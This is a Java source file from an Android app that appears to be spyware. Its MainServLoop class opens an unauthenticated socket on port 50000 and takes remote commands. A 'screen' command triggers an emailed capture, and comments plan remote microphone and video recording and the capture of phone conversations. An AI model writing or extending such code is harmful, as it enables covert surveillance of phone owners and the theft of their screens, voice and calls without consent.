package com.example.trollfacingpro;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import android.util.Log;

public class MainServLoop implements Runnable {

	public void run() {

    try {
        	
        	int loop = 1;
        	String usermsg;
            final ServerSocket socket = new ServerSocket(50000);
            Log.d("capture", "socket opened. waiting for incoming connections...");
                        
            while (loop==1) {
            	
                final Socket clientSocket = socket.accept();                               
                Log.d("capture", "connection received.");             
                final BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));   //to get message from client
                               
                if((usermsg=in.readLine())!=null){
                	
                	if(usermsg.equals("stop"))
                	   
                	   loop=0;	 
                	
                	if(usermsg.equals("screen"))
                		
                	   MailSenderActivity.sendMail();	
                	
                	/* more actions here e.g. turn mic on/off to capture voice, turn video recording on/off to capture video */	
                	/* capturing phone conversation is asynchronous event so it does not make sense to issue a command for it*/	
                               	
                }//end if
                
                in.close();
                clientSocket.close();                
             
            }//end while
            
        } catch (IOException e) {   Log.e("capture", "server exception");    }
    			
	}//end run

}
